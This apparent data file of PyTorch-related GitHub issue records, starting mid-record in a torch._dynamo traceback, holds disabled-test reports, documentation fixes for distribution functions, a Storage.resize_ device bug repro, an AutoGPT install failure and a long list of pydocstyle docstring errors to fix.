    return _compile(
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/convert_frame.py"", line 614, in _compile
    raise InternalTorchDynamoError(str(e)).with_traceback(
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/convert_frame.py"", line 595, in _compile
    guarded_code = compile_inner(code, one_graph, hooks, transform)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/utils.py"", line 243, in time_wrapper
    r = func(*args, **kwargs)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/convert_frame.py"", line 512, in compile_inner
    out_code = transform_code_object(code, transform)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/bytecode_transformation.py"", line 1033, in transform_code_object
    transformations(instructions, code_options)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/convert_frame.py"", line 150, in _fn
    return fn(*args, **kwargs)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/convert_frame.py"", line 477, in transform
    tracer.run()
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/symbolic_convert.py"", line 2120, in run
    super().run()
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/symbolic_convert.py"", line 815, in run
    and self.step()
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/symbolic_convert.py"", line 778, in step
    getattr(self, inst.opname)(inst)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/symbolic_convert.py"", line 469, in wrapper
    return inner_fn(self, inst)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/symbolic_convert.py"", line 1259, in CALL_FUNCTION_KW
    self.call_function(fn, args, kwargs)
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/symbolic_convert.py"", line 650, in call_function
    self.push(fn.call_function(self, args, kwargs))
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/variables/torch.py"", line 572, in call_function
    kwargs_as_value = {k: v.as_python_constant() for k, v in kwargs.items()}
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/variables/torch.py"", line 572, in <dictcomp>
    kwargs_as_value = {k: v.as_python_constant() for k, v in kwargs.items()}
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/variables/lists.py"", line 66, in as_python_constant
    return self.python_type()([x.as_python_constant() for x in self.items])
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/variables/lists.py"", line 66, in <listcomp>
    return self.python_type()([x.as_python_constant() for x in self.items])
  File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/_dynamo/variables/base.py"", line 238, in as_python_constant
    raise NotImplementedError(f""{self} is not a constant"")
torch._dynamo.exc.InternalTorchDynamoError: SymNodeVariable() is not a constant

from user code:
   File ""/opt/conda/envs/py_3.10/lib/python3.10/site-packages/torch/distributed/tensor/parallel/_data_parallel_utils.py"", line 18, in _unflatten_tensor
    result = DistributedTensor.from_local(

Set TORCH_LOGS=""+dynamo"" and TORCHDYNAMO_VERBOSE=1 for more information


You can suppress this exception and fall back to eager by setting:
    import torch._dynamo
    torch._dynamo.config.suppress_errors = True


To execute this test, run the following from the base repo dir:
     python test/distributed/_tensor/test_dtensor_compile.py -k test_2d_fsdp_tp_ac_compile

This message can be suppressed by setting PYTORCH_PRINT_REPRO_ON_FAILURE=0


----------------------------- Captured stdout call -----------------------------
Process 2 terminated with exit code 10, terminating remaining processes.
------------------------------ Captured log call -------------------------------
INFO     numba.cuda.cudadrv.driver:driver.py:245 init
```

This test was disabled because it is failing on main branch ([recent examples](http://torch-ci.com/failure/distributed%2F_tensor%2Ftest_dtensor_compile.py%3A%3ATestDTensorCompileE2E%3A%3Atest_2d_fsdp_tp_ac_compile)).",False
Please support Python 3.12.0 ,"### üöÄ The feature, motivation and pitch

Please support Python 3.12.0

### Alternatives

_No response_

### Additional context

_No response_",False
DISABLED test_output_match_atan2_cpu_float16 (__main__.TestOnnxModelOutputConsistency_opset12CPU) module: onnx triaged skipped,"Platforms: linux

This test was disabled because it is failing on main branch ([recent examples](https://hud.pytorch.org/failure?name=pull%20%2F%20linux-focal-py3.8-clang10-onnx%20%2F%20test%20(default%2C%202%2C%202%2C%20linux.2xlarge)&jobName=undefined&failureCaptures=%5B%22onnx%2Ftest_op_consistency.py%3A%3ATestOnnxModelOutputConsistency_opset12CPU%3A%3Atest_output_match_atan2_cpu_float16%22%5D)).

Same as https://github.com/pytorch/pytorch/issues/113526",False
DISABLED test_output_match_atan2_cpu_float16 (__main__.TestOnnxModelOutputConsistency_opset11CPU) module: onnx triaged skipped,"Platforms: linux

This test was disabled because it is failing on main branch ([recent examples](https://hud.pytorch.org/failure?name=pull%20%2F%20linux-focal-py3.8-clang10-onnx%20%2F%20test%20(default%2C%202%2C%202%2C%20linux.2xlarge)&jobName=undefined&failureCaptures=%5B%22onnx%2Ftest_op_consistency.py%3A%3ATestOnnxModelOutputConsistency_opset11CPU%3A%3Atest_output_match_atan2_cpu_float16%22%5D)).

Same as https://github.com/pytorch/pytorch/issues/113526",False
DISABLED test_output_match_atan2_cpu_float16 (__main__.TestOnnxModelOutputConsistency_opset10CPU) module: onnx triaged skipped,"Platforms: linux

This test was disabled because it is failing on main branch ([recent examples](https://hud.pytorch.org/failure?name=pull%20%2F%20linux-focal-py3.8-clang10-onnx%20%2F%20test%20(default%2C%202%2C%202%2C%20linux.2xlarge)&jobName=undefined&failureCaptures=%5B%22onnx%2Ftest_op_consistency.py%3A%3ATestOnnxModelOutputConsistency_opset10CPU%3A%3Atest_output_match_atan2_cpu_float16%22%5D)).

Same as https://github.com/pytorch/pytorch/issues/113526",False
DISABLED test_output_match_atan2_cpu_float16 (__main__.TestOnnxModelOutputConsistency_opset9CPU) module: onnx triaged skipped,"Platforms: linux

This test was disabled because it is failing on main branch ([recent examples](https://hud.pytorch.org/failure?name=pull%20%2F%20linux-focal-py3.8-clang10-onnx%20%2F%20test%20(default%2C%202%2C%202%2C%20linux.2xlarge)&jobName=linux-focal-py3.8-clang10-onnx%20%2F%20test%20(default%2C%202%2C%202%2C%20linux.2xlarge)&failureCaptures=%5B%22onnx%2Ftest_op_consistency.py%3A%3ATestOnnxModelOutputConsistency_opset9CPU%3A%3Atest_output_match_atan2_cpu_float16%22%5D)).

This is failing in trunk after https://github.com/pytorch/pytorch/pull/113404, for example https://hud.pytorch.org/pytorch/pytorch/commit/39ca5a3226331428465a84d53d5b50dfb4406cfe.  The tests didn't fail on PR.

cc @BowenBao @justinchuby ",False
problem pip install -r requirements.txt ,"### üìö The doc issue

hi problem pip install -r requirements.txt
No matter what I do, auto gpt is not installed

 File ""C:\Users\windo\AppData\Local\Programs\Python\Python312\Lib\site-packages\pip\_vendor\pyproject_hooks\_in_process\_in_process.py"", line 353, in <module>
          main()
        File ""C:\Users\windo\AppData\Local\Programs\Python\Python312\Lib\site-packages\pip\_vendor\pyproject_hooks\_in_process\_in_process.py"", line 335, in main
          json_out['return_val'] = hook(**hook_input['kwargs'])
                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
        File ""C:\Users\windo\AppData\Local\Programs\Python\Python312\Lib\site-packages\pip\_vendor\pyproject_hooks\_in_process\_in_process.py"", line 118, in get_requires_for_build_wheel
          return hook(config_settings)
                 ^^^^^^^^^^^^^^^^^^^^^
        File ""C:\Users\windo\AppData\Local\Temp\pip-build-env-zhw3nbt6\overlay\Lib\site-packages\setuptools\build_meta.py"", line 355, in get_requires_for_build_wheel
          return self._get_build_requires(config_settings, requirements=['wheel'])
                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
        File ""C:\Users\windo\AppData\Local\Temp\pip-build-env-zhw3nbt6\overlay\Lib\site-packages\setuptools\build_meta.py"", line 325, in _get_build_requires
          self.run_setup()
        File ""C:\Users\windo\AppData\Local\Temp\pip-build-env-zhw3nbt6\overlay\Lib\site-packages\setuptools\build_meta.py"", line 341, in run_setup
          exec(code, locals())
        File ""<string>"", line 288, in <module>
        File ""C:\Users\windo\AppData\Local\Temp\pip-build-env-zhw3nbt6\overlay\Lib\site-packages\setuptools\__init__.py"", line 103, in setup
          return distutils.core.setup(**attrs)
                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
        File ""C:\Users\windo\AppData\Local\Temp\pip-build-env-zhw3nbt6\overlay\Lib\site-packages\setuptools\_distutils\core.py"", line 185, in setup
          return run_commands(dist)
                 ^^^^^^^^^^^^^^^^^^
        File ""C:\Users\windo\AppData\Local\Temp\pip-build-env-zhw3nbt6\overlay\Lib\site-packages\setuptools\_distutils\core.py"", line 201, in run_commands
          dist.run_commands()
        File ""C:\Users\windo\AppData\Local\Temp\pip-build-env-zhw3nbt6\overlay\Lib\site-packages\setuptools\_distutils\dist.py"", line 969, in run_commands
          self.run_command(cmd)
        File ""C:\Users\windo\AppData\Local\Temp\pip-build-env-zhw3nbt6\overlay\Lib\site-packages\setuptools\dist.py"", line 989, in run_command
          super().run_command(command)
        File ""C:\Users\windo\AppData\Local\Temp\pip-build-env-zhw3nbt6\overlay\Lib\site-packages\setuptools\_distutils\dist.py"", line 988, in run_command
          cmd_obj.run()
        File ""C:\Users\windo\AppData\Local\Temp\pip-build-env-zhw3nbt6\overlay\Lib\site-packages\setuptools\command\egg_info.py"", line 318, in run
          self.find_sources()
        File ""C:\Users\windo\AppData\Local\Temp\pip-build-env-zhw3nbt6\overlay\Lib\site-packages\setuptools\command\egg_info.py"", line 326, in find_sources
          mm.run()
        File ""C:\Users\windo\AppData\Local\Temp\pip-build-env-zhw3nbt6\overlay\Lib\site-packages\setuptools\command\egg_info.py"", line 548, in run
          self.add_defaults()
        File ""C:\Users\windo\AppData\Local\Temp\pip-build-env-zhw3nbt6\overlay\Lib\site-packages\setuptools\command\egg_info.py"", line 586, in add_defaults
          sdist.add_defaults(self)
        File ""C:\Users\windo\AppData\Local\Temp\pip-build-env-zhw3nbt6\overlay\Lib\site-packages\setuptools\command\sdist.py"", line 113, in add_defaults
          super().add_defaults()
        File ""C:\Users\windo\AppData\Local\Temp\pip-build-env-zhw3nbt6\overlay\Lib\site-packages\setuptools\_distutils\command\sdist.py"", line 251, in add_defaults
          self._add_defaults_ext()
        File ""C:\Users\windo\AppData\Local\Temp\pip-build-env-zhw3nbt6\overlay\Lib\site-packages\setuptools\_distutils\command\sdist.py"", line 336, in _add_defaults_ext
          self.filelist.extend(build_ext.get_source_files())
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
        File ""<string>"", line 204, in get_source_files
        File ""C:\Users\windo\AppData\Local\Temp\pip-build-env-zhw3nbt6\overlay\Lib\site-packages\setuptools\_distutils\cmd.py"", line 107, in __getattr__
          raise AttributeError(attr)
      AttributeError: cython_sources
      [end of output]

  note: This error originates from a subprocess, and is likely not a problem with pip.
error: subprocess-exited-with-error

√ó Getting requirements to build wheel did not run successfully.
‚îÇ exit code: 1
‚ï∞‚îÄ> See above for output.

note: This error originates from a subprocess, and is likely not a problem with pip.
PS C:\AutoGPT\AutoGPT\AutoGPT-stable>

### Suggest a potential alternative/fix

_No response_",False
Getting log for pytorch models ,"Hi,
   I would like know how we can generate log in pytorch that is in tenosrflow we have option of setting TF_CPP_MAX_VLOG_LEVEL flag.Do we have any options like this in pytorch.

Thanks
",False
Integrate Llama2 recipe on Intel platforms to llama-recipes docathon-h2-2023,"### üìö The doc issue

This request is to integrate Intel recipes of running Llama2 with Intel optimizations on Intel platforms to https://github.com/facebookresearch/llama-recipes/tree/main

### Suggest a potential alternative/fix

_No response_",False
A tutorial for introducing the third-party malloc library to improve pytorch memory performance on Windows feature module: windows module: memory usage triaged,"### üìö The doc issue

The tutorial is to introduce the new feature implemented by https://github.com/pytorch/pytorch/issues/102534 to accelerate performance on windows

### Suggest a potential alternative/fix

_No response_

cc @peterjc123 @mszhanyi @skyline75489 @nbcsm @vladimir-aubrecht @iremyux @Blackhex @cristianPanaite @fritzo @neerajprad @alicanb @nikitaved",False
[doc] clarify the range of sampled rv for torch.tensor.exponential_ module: distributions module: docs triaged docathon-h2-2023,"### üìö The doc issue

Range of sampled random variable needs to be clarified for torch.tensor.exponential_ whose supported interval is (0, inf) is different from [0, inf] of exponential distribution.

Background: https://github.com/pytorch/pytorch/pull/37984#discussion_r1059527457, https://github.com/pytorch/pytorch/issues/48841#issuecomment-1530439039, https://github.com/pytorch/pytorch/pull/91673#discussion_r1069955813

cc @fritzo @neerajprad @alicanb @nikitaved @svekars @carljparker

Implemented by https://github.com/pytorch/pytorch/pull/113195

### Suggest a potential alternative/fix

_No response_",False
[doc] two diff meanings of rv generated by torch.tensor.geometric_ and torch.distributions.geometric.Geometric module: distributions module: docs triaged docathon-h2-2023,"### üìö The doc issue

The meaning of random variables generated by torch.tensor.geometric_ and torch.distributions.geometric.Geometric are different, and they are defined by two different PMFs.
Inform the user, so the user can choose their desired one.

Background: https://github.com/pytorch/pytorch/pull/37984#issuecomment-630336511

cc @fritzo @neerajprad @alicanb @nikitaved @svekars @carljparker

Implemented by https://github.com/pytorch/pytorch/pull/113183

### Suggest a potential alternative/fix

_No response_",False
[doc] scale parameter notation for torch.Tensor.cauchy_ is misleading module: distributions module: docs triaged docathon-h2-2023,"### üìö The doc issue

Scale parameter notation currently used for torch.Tensor.cauchy_ is misleading.
Sigma (œÉ) is usually used to denote square root of variance. Variance is undefined in Cauchy distribution.
Replace sigma (œÉ) with gamma (Œ≥).

Background: https://github.com/pytorch/pytorch/pull/37984#discussion_r1059551749

cc @fritzo @neerajprad @alicanb @nikitaved @svekars @carljparker

Implemented by https://github.com/pytorch/pytorch/pull/113178

### Suggest a potential alternative/fix

_No response_",False
"[doc] torch.tensor.geometric_, torch.tensor.uniform_ fix PMF vs PDF module: distributions module: docs triaged docathon-h2-2023","### üìö The doc issue

Geometric distribution is discrete, fix to PMF (probability mass function)
Continuous uniform distribution is continuous, fix to PDF (probability density function)

Implemented by https://github.com/pytorch/pytorch/pull/113109

### Suggest a potential alternative/fix

_No response_

cc @fritzo @neerajprad @alicanb @nikitaved @svekars @carljparker",False
`Storage.resize_()` moves storage to current device module: cuda triaged,"```
import torch

assert torch.cuda.device_count() >= 2

with torch.cuda.device(1):
    x = torch.zeros((2, 3), device=""cuda:0"")
    print(f""(before op) x.device: {x.device} x.untyped_storage().device: {x.untyped_storage().device}"")
    x.untyped_storage().resize_(0)
    print(
        f""(after op) x.device: {x.device} x.untyped_storage().device: {x.untyped_storage().device}""
    )
```

```
(before op) x.device: cuda:0 x.untyped_storage().device: cuda:0
(after op) x.device: cuda:0 x.untyped_storage().device: cuda:1
```

<details>
<summary> Old Distributed Repro </summary>

```
torchrun --nproc_per_node=2 repro.py 
```

```
import os

import torch
from torch import distributed

local_rank = int(os.getenv(""LOCAL_RANK"", 0))
world_size = int(os.getenv(""WORLD_SIZE"", 1))
distributed.init_process_group(backend=""nccl"", rank=local_rank, world_size=world_size)
device = torch.device(""cuda"", local_rank)
print(f""rank={local_rank} world size={world_size} device={device} current device: {torch.cuda.current_device()}"")

t = torch.randn((1024,), device=f""cuda:{local_rank}"")
if local_rank == 1:
    print(f""[Rank {local_rank}] t.device: {t.device} t.untyped_storage().device: {t.untyped_storage().device}"")
    print(f""[Rank {local_rank}] id(t.untyped_storage()): {id(t.untyped_storage())}"")
    print(f""[Rank {local_rank}] t.untyped_storage().resize_(4).device: {t.untyped_storage().resize_(4).device} t.device: {t.device}"")
    print(f""[Rank {local_rank}] id(t.untyped_storage()): {id(t.untyped_storage())}"")
```

```
rank=1 world size=2 device=cuda:1 current device: 0
rank=0 world size=2 device=cuda:0 current device: 0
[Rank 1] t.device: cuda:1 t.untyped_storage().device: cuda:1
[Rank 1] id(t.untyped_storage()): 139630240323904
[Rank 1] t.untyped_storage().resize_(4).device: cuda:0 t.device: cuda:1
[Rank 1] id(t.untyped_storage()): 139630240323904
```
</details>

cc @ptrblck",False
UNSTABLE pull / linux-focal-py3_8-clang9-xla / test (xla) module: ci triaged unstable,"
XLA is a bit flaky at the moment due to test_xla_backend_intf sometimes failing.

Ex https://hud.pytorch.org/pytorch/pytorch/commit/1f3fa13f0ace035f453651c6da3e96cb64413674

I have asked @JackCaoG to skip in XLA repo.  This should be closed after that PR lands and the pin is updated.


cc @seemethere @malfet @pytorch/pytorch-dev-infra",False
`inference_mode` documentation is incorrect triaged actionable inference mode topic: docs,"### üìö The doc issue

https://pytorch.org/docs/stable/generated/torch.inference_mode.html

At the end of the example code, we have this:

```
>>> @torch.inference_mode
... def doubler(x):
...     return x * 2
>>> out = doubler(x)
>>> out.requires_grad
False
```

However, `@torch.inference_mode` doesn't work as is, it seems that it needs to be `@torch.inference_mode()` (with the parenthesis).

Executing the code as in the example gives:
```
>>> doubler(x)
<function torch.context_decorator.<locals>.decorate_context>
```

### Suggest a potential alternative/fix

_No response_",False
"Fix docstring errors in _fuser.py, _state.py, __init__.py, _freeze.py, _async.py, _recursive.py, _tensorboard_vis.py, _trace.py, _await.py, _check.py, _serialization.py, _script.py, annotations.py, _monkeytype_config.py module: docs triaged medium docathon-h2-2023","Please fix the following issues.
First, make sure to install the required tools:
```
pip3 install pydocstyle
```
```
pip3 install ruff
```
Then complete the followings steps:
 1. Run `pydocstyle` to see the number of errors in the file: 
 ```
pydocstyle path-to-file --count
```
 &nbsp; &nbsp; This command prints out the number of errors at the end of the output. Save this output to later add it to your PR description.
2. Next, run `ruff` which should help autofix many of these errors:
```
ruff --select RULECODE --fix path_to_file
```
&nbsp; &nbsp; `RULECODE` is the error code from the output in the issue, for example, **D200**. See the complete list of rules and autofixes [here](https://docs.astral.sh/ruff/rules/#pydocstyle-d).
3. You can run the above command with the `--unsafe-fixes` option. Double-check that the applied fixes are correct.
4. Fix the remaining issues. Fix **only** the errors listed in the issue. Skip the 'Missing docstrings' errors.
5. Run pydocstyle again:
```
pydocstyle path-to-file --count
```
This **number might not be 0** which is **OK**. Add the count of fixed errors to your PR description. 
- **Error Code**: **D205**, **File**: `torch/sparse/__init__.py`, **Entity**: `sum`, **Line**: 178, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/sparse/__init__.py`, **Entity**: `sum`, **Line**: 178, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D401**, **File**: `torch/sparse/__init__.py`, **Entity**: `sum`, **Line**: 178, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D207**, **File**: `torch/sparse/__init__.py`, **Entity**: `check_sparse_tensor_invariants`, **Line**: 386, **Description**: Docstring is under-indented
- **Error Code**: **D207**, **File**: `torch/sparse/__init__.py`, **Entity**: `is_enabled`, **Line**: 431, **Description**: Docstring is under-indented
- **Error Code**: **D401**, **File**: `torch/sparse/__init__.py`, **Entity**: `is_enabled`, **Line**: 431, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D207**, **File**: `torch/sparse/__init__.py`, **Entity**: `enable`, **Line**: 443, **Description**: Docstring is under-indented
- **Error Code**: **D207**, **File**: `torch/sparse/__init__.py`, **Entity**: `disable`, **Line**: 463, **Description**: Docstring is under-indented
- **Error Code**: **D401**, **File**: `torch/contrib/_tensorboard_vis.py`, **Entity**: `visualize_graph_executor`, **Line**: 54, **Description**: First line should be in imperative mood (perhaps 'Append', not 'Appends')
- **Error Code**: **D400**, **File**: `torch/jit/_state.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D200**, **File**: `torch/jit/_monkeytype_config.py`, **Entity**: `get_type`, **Line**: 35, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D401**, **File**: `torch/jit/_monkeytype_config.py`, **Entity**: `get_type`, **Line**: 35, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **Error Code**: **D205**, **File**: `torch/jit/_monkeytype_config.py`, **Entity**: `get_optional_of_element_type`, **Line**: 56, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_monkeytype_config.py`, **Entity**: `get_optional_of_element_type`, **Line**: 56, **Description**: First line should end with a period (not 'l')
- **Error Code**: **D401**, **File**: `torch/jit/_monkeytype_config.py`, **Entity**: `get_optional_of_element_type`, **Line**: 56, **Description**: First line should be in imperative mood; try rephrasing (found 'Helper')
- **Error Code**: **D204**, **File**: `torch/jit/_monkeytype_config.py`, **Entity**: `JitTypeTraceStoreLogger`, **Line**: 74, **Description**: 1 blank line required after class docstring (found 0)
- **Error Code**: **D205**, **File**: `torch/jit/_monkeytype_config.py`, **Entity**: `trace_logger`, **Line**: 139, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_monkeytype_config.py`, **Entity**: `trace_logger`, **Line**: 139, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/jit/_monkeytype_config.py`, **Entity**: `trace_logger`, **Line**: 139, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/jit/_monkeytype_config.py`, **Entity**: `jit_code_filter`, **Line**: 168, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/jit/_monkeytype_config.py`, **Entity**: `jit_code_filter`, **Line**: 168, **Description**: First line should be in imperative mood; try rephrasing (found 'Custom')
- **Error Code**: **D205**, **File**: `torch/jit/_fuser.py`, **Entity**: `optimized_execution`, **Line**: 8, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_fuser.py`, **Entity**: `optimized_execution`, **Line**: 8, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D401**, **File**: `torch/jit/_fuser.py`, **Entity**: `optimized_execution`, **Line**: 8, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
- **Error Code**: **D205**, **File**: `torch/jit/_fuser.py`, **Entity**: `fuser`, **Line**: 21, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_fuser.py`, **Entity**: `fuser`, **Line**: 21, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D401**, **File**: `torch/jit/_fuser.py`, **Entity**: `fuser`, **Line**: 21, **Description**: First line should be in imperative mood; try rephrasing (found 'A')
- **Error Code**: **D401**, **File**: `torch/jit/_fuser.py`, **Entity**: `set_fusion_strategy`, **Line**: 130, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **Error Code**: **D205**, **File**: `torch/jit/_async.py`, **Entity**: ``, **Line**: 1, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_async.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 'I')
- **Error Code**: **D205**, **File**: `torch/jit/_async.py`, **Entity**: `fork`, **Line**: 20, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_async.py`, **Entity**: `fork`, **Line**: 20, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D401**, **File**: `torch/jit/_async.py`, **Entity**: `fork`, **Line**: 20, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **Error Code**: **D205**, **File**: `torch/jit/_async.py`, **Entity**: `wait`, **Line**: 88, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_async.py`, **Entity**: `wait`, **Line**: 88, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D401**, **File**: `torch/jit/_async.py`, **Entity**: `wait`, **Line**: 88, **Description**: First line should be in imperative mood (perhaps 'Force', not 'Forces')
- **Error Code**: **D205**, **File**: `torch/jit/_await.py`, **Entity**: `_awaitable`, **Line**: 10, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_await.py`, **Entity**: `_awaitable`, **Line**: 10, **Description**: First line should end with a period (not ',')
- **Error Code**: **D401**, **File**: `torch/jit/_await.py`, **Entity**: `_awaitable`, **Line**: 10, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **Error Code**: **D205**, **File**: `torch/jit/_await.py`, **Entity**: `_awaitable_wait`, **Line**: 17, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_await.py`, **Entity**: `_awaitable_wait`, **Line**: 17, **Description**: First line should end with a period (not ',')
- **Error Code**: **D401**, **File**: `torch/jit/_await.py`, **Entity**: `_awaitable_wait`, **Line**: 17, **Description**: First line should be in imperative mood (perhaps 'Request', not 'Requests')
- **Error Code**: **D200**, **File**: `torch/jit/_await.py`, **Entity**: `_awaitable_nowait`, **Line**: 24, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D401**, **File**: `torch/jit/_await.py`, **Entity**: `_awaitable_nowait`, **Line**: 24, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **Error Code**: **D205**, **File**: `torch/jit/_check.py`, **Entity**: `AttributeTypeIsSupportedChecker`, **Line**: 9, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_check.py`, **Entity**: `AttributeTypeIsSupportedChecker`, **Line**: 9, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D412**, **File**: `torch/jit/_check.py`, **Entity**: `AttributeTypeIsSupportedChecker`, **Line**: 9, **Description**: No blank lines allowed between a section header and its content ('Example')
- **Error Code**: **D205**, **File**: `torch/jit/_check.py`, **Entity**: `visit_Assign`, **Line**: 106, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_check.py`, **Entity**: `visit_Assign`, **Line**: 106, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D205**, **File**: `torch/jit/_check.py`, **Entity**: `visit_AnnAssign`, **Line**: 126, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_check.py`, **Entity**: `visit_AnnAssign`, **Line**: 126, **Description**: First line should end with a period (not '`')
- **Error Code**: **D205**, **File**: `torch/jit/_check.py`, **Entity**: `visit_Call`, **Line**: 179, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_check.py`, **Entity**: `visit_Call`, **Line**: 179, **Description**: First line should end with a period (not '`')
- **Error Code**: **D400**, **File**: `torch/jit/_freeze.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 'g')
- **Error Code**: **D205**, **File**: `torch/jit/_freeze.py`, **Entity**: `freeze`, **Line**: 14, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_freeze.py`, **Entity**: `freeze`, **Line**: 14, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D205**, **File**: `torch/jit/_freeze.py`, **Entity**: `run_frozen_optimizations`, **Line**: 125, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/jit/_freeze.py`, **Entity**: `run_frozen_optimizations`, **Line**: 125, **Description**: First line should be in imperative mood (perhaps 'Run', not 'Runs')
- **Error Code**: **D205**, **File**: `torch/jit/_freeze.py`, **Entity**: `optimize_for_inference`, **Line**: 178, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_freeze.py`, **Entity**: `optimize_for_inference`, **Line**: 178, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D401**, **File**: `torch/jit/_freeze.py`, **Entity**: `optimize_for_inference`, **Line**: 178, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **Error Code**: **D205**, **File**: `torch/jit/_recursive.py`, **Entity**: `infer_concrete_type_builder`, **Line**: 129, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_recursive.py`, **Entity**: `infer_concrete_type_builder`, **Line**: 129, **Description**: First line should end with a period (not 's')
- **Error Code**: **D205**, **File**: `torch/jit/_recursive.py`, **Entity**: `get_or_create_concrete_type`, **Line**: 365, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_recursive.py`, **Entity**: `get_or_create_concrete_type`, **Line**: 365, **Description**: First line should end with a period (not 'T')
- **Error Code**: **D205**, **File**: `torch/jit/_recursive.py`, **Entity**: `get_module_concrete_type`, **Line**: 409, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_recursive.py`, **Entity**: `get_module_concrete_type`, **Line**: 409, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D401**, **File**: `torch/jit/_recursive.py`, **Entity**: `get_module_concrete_type`, **Line**: 409, **Description**: First line should be in imperative mood (perhaps 'Get', not 'Gets')
- **Error Code**: **D400**, **File**: `torch/jit/_recursive.py`, **Entity**: `create_script_module`, **Line**: 460, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D401**, **File**: `torch/jit/_recursive.py`, **Entity**: `create_script_module`, **Line**: 460, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **Error Code**: **D205**, **File**: `torch/jit/_recursive.py`, **Entity**: `infer_methods_to_compile`, **Line**: 711, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/jit/_recursive.py`, **Entity**: `infer_methods_to_compile`, **Line**: 711, **Description**: First line should end with a period (not 'g')
